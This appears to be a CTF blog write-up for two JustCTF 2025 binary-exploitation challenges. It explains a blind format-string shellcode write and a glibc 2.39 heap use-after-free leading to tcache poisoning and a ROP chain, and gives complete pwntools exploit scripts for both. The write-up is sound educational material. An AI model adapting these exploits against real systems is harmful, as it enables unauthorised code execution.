---
layout: default
title: "JustCTF 2025 Pwn Writeups"
description: "Writeups of JustCTF 2025 pwn challenges."
og_description: "Writeups of pwn challenges."
og_type: "ctf writeup"
keywords: "writeups,Sarvesh Aadhithya,CTFs, JustCTF, 2025,zoozoo-sec, zoozoo"

permalink: /writeups/JustCTF2025/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />

<section id="back" class="back">
<div id="challenge-links">
        <h1 class="text"><code>
JustCTF 2025</code></h1>
        <ul>
            <li><a href="#shellcodeprinter"><code>Shellcode Printer</code></a></li>
            <li><a href="#babyheap"><code>Baby Heap</code></a></li>
            <li><a href="#prospector"><code>Prospector</code></a></li>
        </ul>
    </div>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="shellcodeprinter" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Shellcode Printing</span><br>
            <b>Category:</b> Binary Exploitation<br>
            <p><br>
                Here we are again — classic shellcode injection challenge... or is it?<br>
                This one isn’t the "copy-paste shellcode into a buffer and pray" kind of gig.<br>
                Instead of handing us a nice, friendly buffer and saying, <code>“Please inject shellcode here”</code>, this binary decided to play tricks with a format string vulnerability.
            </p>
        </div>
        <div class="section-content">
            <h1>Fmt-String Shenanigans</h1>
            <img src="{{ '/writeups/JustCTF2025/assets/shellcodeprinter.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            <p>
                You’d expect this to be your average <code>printf</code>-style info leak, right?<br>
                Surprise — it’s <code>fprintf()</code> to <code>/dev/null</code>. Yep, all output gone. Poof.<br>
                Any attempt to <code>%p</code>, <code>%s</code>, <code>%n</code>, or <code>%lx</code> your way to memory leaks? Straight into the void.
            </p>
            <p>
                But hold up… just because we can't read, doesn’t mean we can’t write.<br>
                That’s where the beauty lies — <code>fprintf()</code> + format string = write-what-where primitive.<br>
                (Just don’t expect it to hold your hand.)
            </p>
        </div>
        <div class="section-content">
            <h4>Enter mmap()</h4>
            <p>
                So, where are we even writing this shellcode to?<br>
                This binary uses <code>mmap()</code> to allocate a memory region — with RWX permissions — and stores the pointer on the stack.<br>
                Lucky for us, it’s just sitting at <code>rsp + 8</code>, waiting to be used.
            </p>
        </div>
        <div class="section-content">
            <h4>But There’s a Twist…</h4>
            <p>
                You don't get to write the whole shellcode in one go. Why?<br>
                Because this binary is a little extra.<br>
                After each input, the pointer into the <code>mmap</code>’d region gets bumped by 2 bytes.<br>
                So yeah — your write is 2 bytes per input.
            </p>
            <p>
                Still manageable.<br>
                Bonus: The input loop continues until you send a null byte.<br>
                So you can inject shellcode chunks, 2 bytes at a time, with each input round.
            </p>
        </div>
        <div class="section-content">
            <h4>And Then… It Breaks.</h4>
            <p>
                Just as you're about to finish writing your shellcode, the pointer ends up pointing to the end of the mmap'd region.<br>
                When the execution jumps to that pointer — it’s basically trying to run off the end of your shellcode.<br>
                That’s no good.
            </p>
        </div>
        <div class="section-content">
            <h4>The Jump Trick</h4>
            <p>
                Here’s the trick:<br>
                Write a <code>jmp</code> instruction at the end — one that jumps back to the start of your shellcode.<br>
                Since <code>jmp</code> is only 2 bytes (opcode + offset), and the pointer increments by 2 bytes per input, you can place it precisely.<br>
                For this one, we cheat a little — write 3 bytes to land the jump.<br>
                And just like that, execution jumps to the start — and we get the shell.
            </p>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
                <h4>Exploit Script</h4>
                <button class="copy-btn">Copy</button>
            </div>
<pre><code class="language-python">from pwn import *
import struct

context.arch = "amd64"
context.log_level = "info"

def split_shell(shellcode):
    chunks = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
    words = []
    for chunk in chunks:
        if len(chunk) < 2:
            chunk += b'\x00'
        val = struct.unpack('&lt;H', chunk)[0]
        words.append(val)
    return words

def build_fmt_payload(value, offset=6):
    return f"%{value}c%{offset}$hn"

def generate_shellcode():
    return asm('''
        start:
            xor rax, rax
            push rax
            push rax
            pop rsi
            pop rdx
            mov rbx, 0x68732f6e69622f2f
            shr rbx, 8
            push rbx
            mov rdi, rsp
            mov al, 59
            syscall
            nop
            nop
            jmp start
    ''')

def exploit():
    io = process("./shellcode_printer_patched")

    raw_shellcode = generate_shellcode()
    shellcode_to_send = raw_shellcode[:-3]
    splitted = split_shell(shellcode_to_send)

    for i, word in enumerate(splitted):
        fmt = build_fmt_payload(word)
        log.info(f"Sending chunk {i+1}/{len(splitted)}: {fmt}")
        io.sendline(fmt.encode())

    # Final jump back to start
    io.sendline(b"%14674832c%6$n")

    # Null terminator
    io.sendline(b"\x00")
    io.interactive()

if __name__ == "__main__":
    exploit()</code></pre>
        </div>
    </div>
</section>
</section>


<section id="back">
  <section id="blueback" class="container">
    <div id="babyheap" class="challenge-section">
      <div class="section-content">
        <b>Name:</b> <span class="text"> Baby Heap </span><br>
        <b>Category:</b> Binary Exploitation<br>
        <p><br>
          This one looked simple at first glance — but, as usual, it wasn't going to let us off that easy.<br>
          <br>
          Opening the binary in IDA made the vulnerability jump right out — a <strong>Use-After-Free (UAF)</strong> in the <code>delete()</code> function.<br>
          Why? Because the freed pointer isn’t nulled out afterward. Classic mistake.<br>
          <br>
          Sounds like tcache poisoning material.
        </p>
      </div>

      <div class="section-content">
        <h2>checksec? Oh boy.</h2>
        <pre><code class="language-bash">RELRO:    Full RELRO  
Canary:   Yes  
NX:       Yes  
PIE:      Yes  
SHSTK:    Enabled  
IBT:      Enabled</code></pre>
        <p>
          Yep. All the modern security goodies are turned on.<br>
          So... no GOT overwrite. No return-to-plt. No partial overwrite shenanigans.<br>
          <br>
          And the binary allocates pretty small chunks — so we’re not even getting out of the tcache fastbin area.<br>
          <strong>Leak required.</strong> No exceptions.
        </p>
      </div>

      <div class="section-content">
        <h2>Welcome to the House... of Something?</h2>
        <p>
          Now, we know there are heap exploitation techniques called “House of X” (<code>Lore</code>, <code>Force</code>, <code>Einherjar</code>, etc.).<br>
          But honestly, I don’t even know what this one would be called.<br>
          <br>
          We’re going to:
          <ul>
            <li>Create a fake chunk</li>
            <li>Force it into the <code>unsorted bin</code></li>
            <li>Leak a libc pointer from the <code>main_arena</code> metadata</li>
          </ul>
          Why does that work?<br>
          Because <code>ptmalloc</code> uses a doubly-linked list for unsorted bins, and the chunk's <code>fd</code> and <code>bk</code> pointers end up pointing directly inside <code>main_arena</code>.<br>
          <strong>Beautiful.</strong>
        </p>
      </div>

      <div class="section-content">
        <h2>Gameplan</h2>
        <h4>Step 1: Leak Heap Address + Tcache Key</h4>
        <p>
          Using the UAF, we read a freed chunk and get two things:
          <ul>
            <li><strong>Tcache key</strong> — used for pointer mangling (introduced in glibc 2.32+).</li>
            <li><strong>Mangled pointer</strong> — XORing this with the key gives us a heap leak.</li>
          </ul>
        </p>

        <h4>Step 2: Tcache Poisoning for Controlled Allocation</h4>
        <p>
          We poison the tcache freelist to get a pointer that overlaps with another chunk. This lets us:
          <ul>
            <li>Corrupt its metadata (e.g., the <code>size</code> field).</li>
            <li>Create a fake chunk header with <code>size &gt; 0x408</code> → ensures it goes to the unsorted bin.</li>
          </ul>
          <br>
          💡 <strong>Important glibc 2.39 checks:</strong>
          <ul>
            <li><code>prev_inuse</code> bit of the next chunk must be <code>1</code>, or you'll hit consolidation checks.</li>
            <li>Next chunk’s <code>prev_size</code> and <code>size</code> fields must line up correctly.</li>
            <li>If you corrupt a chunk’s size, make sure you don't accidentally mark it as <code>IS_MMAPPED</code> or you'll crash.</li>
          </ul>
          <img src="{{ '/writeups/JustCTF2025/assets/babyheap1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        </p>

        <h4>Step 3: Trigger Unsorted Bin Insertion</h4>
        <p>
          Now we free our overlapping (victim) chunk with the large fake size → it ends up in the <code>unsorted bin</code>.<br>
          Its <code>fd</code>/<code>bk</code> now point to libc’s <code>main_arena</code>.<br>
          <br>
          <img src="{{ '/writeups/JustCTF2025/assets/babyheap.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          Boom. <strong>Libc leak</strong>.<br>
          From here, we can:
          <ul>
            <li>Compute libc base.</li>
            <li>Poison tcache again — but this time to leak stack address via <code>__environ</code>.</li>
          </ul>
        </p>

        <h4>Step 4: Final Tcache Poisoning – Stack Write</h4>
        <p>
          We tcache-poison again to get an allocation pointing directly to the saved return address on the stack.<br>
          From here, we drop a ROP chain:
          <ul>
            <li><code>pop rdi</code></li>
            <li><code>"/bin/sh"</code></li>
            <li><code>ret</code> (alignment)</li>
            <li><code>system</code></li>
          </ul>
          <br>
          And that’s it — <strong>shell popped.</strong>
        </p>
      </div>
      <div class="section-content">
            <div class="h4-wrapper">
                <h4>Exploit Script</h4>
                <button class="copy-btn">Copy</button>
            </div>
<pre><code class="language-python">from pwn import *

context.binary = exe = ELF('./babyheap_patched', checksec=False)
libc = exe.libc
context.log_level = "info"

# XOR-based pointer mangling (tcache protection)
def mangle(key, addr):
    return key ^ addr

# Allocate chunk
def malloc(idx, data):
    io.sendlineafter(b"> ", b'1')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

# Free chunk
def free(idx):
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b"Index: ", str(idx).encode())

# Read chunk content (8 bytes max expected)
def read(idx):
    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvline().strip().ljust(8, b"\x00")

# Overwrite chunk content
def write(idx, data):
    io.sendlineafter(b"> ", b'3')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

def exploit():
    # Allocate and free chunks to set up leak
    for i in range(2):
        malloc(i, p64(0x11) * 6)
    for i in range(2):
        free(i)

    # Leak tcache key and mangled pointer
    key = u64(read(0))
    mangled = u64(read(1))
    heap_leak = mangled ^ key

    log.success(f"KEY: {hex(key)}")
    log.success(f"MANGLED PTR: {hex(mangled)}")
    log.success(f"HEAP LEAK: {hex(heap_leak)}")

    # Tcache poisoning: overwrite next pointer in tcache entry (index 1)
    write(1, p64(mangle(key, heap_leak + 0x10)))

    # Chunk 2 is dummy to align tcache
    malloc(2, b"dummy")

    # Chunk 3 returns previously poisoned tcache ptr (i.e., index 0 + 16)
    malloc(3, b"victim")

    # Overwrite size field of chunk 0 to 0x421 (fake large chunk)
    write(0, p64(0) + p64(0x421))

    # Allocate and free two more chunks to fill tcache bin for 0x420
    for i in range(4, 6):
        malloc(i, b"dummy")
    for i in range(4, 6):
        free(i)

    # Overwrite next tcache pointer to chunk at heap + 0x420
    target = heap_leak + 0x420
    write(5, p64(mangle(key, target)))

    # Reallocate from poisoned tcache bin
    malloc(6, b"dummy")
    malloc(7, p64(0) + p64(0x11)*5)

    # Free chunk 3 (unsorted bin now) to leak libc via main_arena
    free(3)
    libc_leak = u64(read(3))
    libc.address = libc_leak - 0x203b20
    log.success(f"LIBC BASE: {hex(libc.address)}")

    # Setup tcache poisoining to leak stack address via __environ
    malloc(7, b'8')
    malloc(8, b'9')
    malloc(9, b'10')
    free(8)
    free(9)

    write(9, p64(mangle(key, libc.sym.environ - 0x18)))  # prepare leak from environ
    malloc(10, b'11')
    malloc(11, b'A'*0x18)

    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", b'11')
    io.recvuntil(b"A" * 0x18)
    stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
    log.success(f"STACK LEAK @ {hex(stack_leak)}")

    # Now use tcache poisoning again to write ROP chain to stack
    malloc(13, b'13')
    malloc(14, b'14')
    free(13)
    free(14)

    # Overwrite tcache next ptr to stack - 0x158 (controlled return address)
    write(14, p64(mangle(key, stack_leak - 0x158)))
    malloc(15, b'15') 

    # ROP chain to system("/bin/sh")
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    binsh = next(libc.search(b'/bin/sh\0'))

     # overwrite saved rbp if needed
    payload = flat(
        0,             
        pop_rdi, binsh,
        ret,
        libc.sym.system
    )
    malloc(16, payload)

    # Pop shell
    log.success("🚀 Launching shell...")
    io.interactive()

def main():
    global io
    io = process(exe.path)
    input(f"[+] PID: {io.pid}")  # for attaching GDB manually
    exploit()

if __name__ == "__main__":
    main()
</div>
    </div>
  </section>
</section>



<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="{{ '/writeups/copy.js' | relative_url }}"></script>
